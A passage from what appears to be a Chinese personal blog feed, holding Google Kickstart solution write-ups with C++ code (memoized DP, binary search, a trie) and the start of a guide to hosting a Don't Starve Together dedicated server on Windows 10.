href="#题意-n个栈，每个栈中有k个个元素，让你取p个元素，使得和最大" class="headerlink" title="题意: n个栈，每个栈中有k个个元素，让你取p个元素，使得和最大"></a>题意: n个栈，每个栈中有k个个元素，让你取p个元素，使得和最大</h2><h2 id="题解：-维护n个栈前缀和，记忆化搜索"><a href="#题解：-维护n个栈前缀和，记忆化搜索" class="headerlink" title="题解： 维护n个栈前缀和，记忆化搜索"></a>题解： 维护n个栈前缀和，记忆化搜索</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">db</span> <span class="token expression"><span class="token keyword">double</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">clr</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token function">memset</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">1600</span><span class="token punctuation">;</span><span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> N<span class="token punctuation">,</span> P<span class="token punctuation">,</span> K<span class="token punctuation">;</span><span class="token keyword">int</span> prefix<span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> record<span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> mem<span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//mem[x][y] 表示第x个栈之前已经选择了y个数</span><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> x <span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>y <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> y <span class="token operator">></span> P <span class="token operator">||</span> x <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>mem<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> mem<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token function">min</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span> K<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        mem<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span><span class="token function">dfs</span><span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> y <span class="token operator">-</span> i<span class="token punctuation">)</span> <span class="token operator">+</span> prefix<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> mem<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> mem<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token keyword">int</span> T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> N <span class="token operator">>></span> K <span class="token operator">>></span> P<span class="token punctuation">;</span>    <span class="token function">clr</span><span class="token punctuation">(</span>prefix<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">clr</span><span class="token punctuation">(</span>mem<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> K<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            cin <span class="token operator">>></span> record<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            prefix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> prefix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> record<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Case #"</span> <span class="token operator">&lt;&lt;</span> T <span class="token operator">&lt;&lt;</span> <span class="token string">": "</span> <span class="token operator">&lt;&lt;</span> <span class="token function">dfs</span><span class="token punctuation">(</span>N<span class="token punctuation">,</span> P<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//freopen("out","w",stdout);</span>    <span class="token comment">//freopen("in", "r", stdin);</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> T <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>   <span class="token comment">// cin >> T;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> T<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token function">solve</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="C-Workout"><a href="#C-Workout" class="headerlink" title="C. Workout"></a>C. Workout</h1><h2 id="题意-给定N，K，N个数，N个数字中插入K个数，保持严格递增，求两两数字之间的差值最大的最小值。"><a href="#题意-给定N，K，N个数，N个数字中插入K个数，保持严格递增，求两两数字之间的差值最大的最小值。" class="headerlink" title="题意: 给定N，K，N个数，N个数字中插入K个数，保持严格递增，求两两数字之间的差值最大的最小值。"></a>题意: 给定N，K，N个数，N个数字中插入K个数，保持严格递增，求两两数字之间的差值最大的最小值。</h2><h2 id="题解：二分插值答案"><a href="#题解：二分插值答案" class="headerlink" title="题解：二分插值答案"></a>题解：二分插值答案</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">db</span> <span class="token expression"><span class="token keyword">double</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">clr</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token function">memset</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">2e5</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> inf <span class="token operator">=</span> <span class="token number">0x7ffffff</span><span class="token punctuation">;</span><span class="token keyword">int</span> M<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> N<span class="token punctuation">,</span> K<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> vec<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">judge</span><span class="token punctuation">(</span><span class="token keyword">int</span> d<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>vec<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">%</span>d<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>            cnt <span class="token operator">=</span> cnt <span class="token operator">+</span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">/</span> d <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            cnt <span class="token operator">=</span> cnt <span class="token operator">+</span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">/</span> d<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cnt<span class="token operator">></span>K<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token keyword">int</span> T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span>  dmax <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    vec<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> N <span class="token operator">>></span> K<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> M<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        vec<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>M<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> M<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dmax <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dmax<span class="token punctuation">,</span> M<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> M<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> r <span class="token operator">=</span> dmax<span class="token punctuation">,</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> mid <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>l<span class="token operator">&lt;=</span>r<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">judge</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>            ans <span class="token operator">=</span> mid<span class="token punctuation">,</span> r <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            l <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Case #"</span> <span class="token operator">&lt;&lt;</span> T <span class="token operator">&lt;&lt;</span> <span class="token string">": "</span> <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//freopen("out","w",stdout);</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> T <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> T<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> T<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token function">solve</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="D-Bundling"><a href="#D-Bundling" class="headerlink" title="D. Bundling"></a>D. Bundling</h1><h2 id="题意：给定N，K，N个字符串，N个字符串可以分成-N-K-组，然后定一个值-ans-所有租的前缀相同的字母的和，求这个值的最大值是多少。"><a href="#题意：给定N，K，N个字符串，N个字符串可以分成-N-K-组，然后定一个值-ans-所有租的前缀相同的字母的和，求这个值的最大值是多少。" class="headerlink" title="题意：给定N，K，N个字符串，N个字符串可以分成$ N /K$ 组，然后定一个值$ans=$ 所有租的前缀相同的字母的和，求这个值的最大值是多少。"></a>题意：给定N，K，N个字符串，N个字符串可以分成$ N /K$ 组，然后定一个值$ans=$ 所有租的前缀相同的字母的和，求这个值的最大值是多少。</h2><h2 id="题解：trie-计数-google-编译器无法通过"><a href="#题解：trie-计数-google-编译器无法通过" class="headerlink" title="题解：trie  计数.(google 编译器无法通过)"></a>题解：trie  计数.(google 编译器无法通过)</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">db</span> <span class="token expression"><span class="token keyword">double</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">clr</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token function">memset</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">1e5</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> inf <span class="token operator">=</span> <span class="token number">0x7ffffff</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">Trie</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> next<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ed<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> par<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> dep<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> L<span class="token punctuation">,</span> root<span class="token punctuation">;</span>    <span class="token keyword">int</span> ans<span class="token punctuation">;</span>    <span class="token keyword">int</span> N<span class="token punctuation">,</span> K<span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">newnode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            next<span class="token punctuation">[</span>L<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        ed<span class="token punctuation">[</span>L<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> L<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        ans <span class="token operator">=</span> L <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        root <span class="token operator">=</span> <span class="token function">newnode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> now <span class="token operator">=</span> root<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> sz <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sz<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'A'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'A'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">newnode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                par<span class="token punctuation">[</span>next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'A'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> now<span class="token punctuation">;</span>                dep<span class="token punctuation">[</span>next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'A'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> dep<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            now <span class="token operator">=</span> next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'A'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        ed<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">work</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> L<span class="token punctuation">;</span> i<span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            ans <span class="token operator">+=</span> ed<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">/</span> K <span class="token operator">*</span> dep<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            ed<span class="token punctuation">[</span>par<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+=</span> ed<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%</span> K<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Trie tree<span class="token punctuation">;</span><span class="token keyword">char</span> s<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token keyword">int</span> T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    tree<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> tree<span class="token punctuation">.</span>N <span class="token operator">>></span> tree<span class="token punctuation">.</span>K<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> tree<span class="token punctuation">.</span>N<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> tree<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Case #"</span> <span class="token operator">&lt;&lt;</span> T <span class="token operator">&lt;&lt;</span> <span class="token string">": "</span> <span class="token operator">&lt;&lt;</span> tree<span class="token punctuation">.</span><span class="token function">work</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//  freopen("in","r",stdin);</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> T <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> T<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> T<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token function">solve</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kickstart </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>steam饥荒服务器的搭建(win10)</title>
      <link href="/2020/01/27/%E9%A5%A5%E8%8D%92%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%90%AD%E5%BB%BA-win10/"/>
      <url>/2020/01/27/%E9%A5%A5%E8%8D%92%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%90%AD%E5%BB%BA-win10/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br><span id="more"></span></p><h1 id="1-原因"><a href="#1-原因" class="headerlink" title="1. 原因"></a>1. 原因</h1><p>​        过年闲来无事和朋友打饥荒(Don’t Starve Together Dedicated 以下简称DST)的时候发现异常卡顿，排除掉搭建服务器主机配置的问题，只有可能是网络的问题。引用大神 PaintDream 的<a href="https://www.zhihu.com/question/29937042/answer/118687356">回答</a>：</p><blockquote><p>饥荒的联机版使用自制的RPC来完成通信，这个机制基本上就是一层简单的封装，没有针对网络传输做优化。所有的数据包必须由运行在服务器端的模拟器上顺序执行，这大大放大了网络延迟对游戏的影响。<br>另外，由于模拟器本身优化不足，在地图较大或者MOD较多的时候，服务器可能因CPU单核计算能力不足而卡顿，导致所有客户端都变卡。</p></blockquote><p>和高赞<a href="">回答</a>：</p><blockquote><p>荒联机版会卡确实主要是这个游戏的问题，其实网速和主机关系不大。<br>其实题主搭一个独立服务器就不卡了，这个独立服务器不需要跑在一个独立的主机上，只需要在题主的电脑上单独跑一个服务器进程，然后所有人连入世界就可以了。亲测不卡！</p></blockquote><p>我决定搭建一个本地win 服务器，来更好的玩耍。</p><h1 id="2-步骤"><a href="#2-步骤" class="headerlink" title="2. 步骤"></a>2. 步骤</h1><h2 id="1-下载软件"><a href="#1-下载软件" class="headerlink" title="(1). 下载软件"></a>(1). 下载软件</h2><ul><li>Don’t Starve Together（steam库中的游戏）</li><li>Don’t Starve Together Dedicated Server （steam库中的工具）</li></ul><h2 id="2-复制mod"><a href="#2-复制mod" class="headerlink" title="(2). 复制mod"></a>(2). 复制mod</h2><ul><li>找到 DST 安装目录和DSTS(Don’t Starve Together Dedicated Server)安装目录，将DST中的mods文件夹中 worksshop 开头的文件夹复制到 DSTS中的mods文件夹。</li><li>可以右键单机 steam 库中的DST，单机属性-&gt;本地文件-&gt;浏览本地文件，快速找到安装目录。</li></ul><h2 id="3-找到存档"><a href="#3-找到存档" class="headerlink" 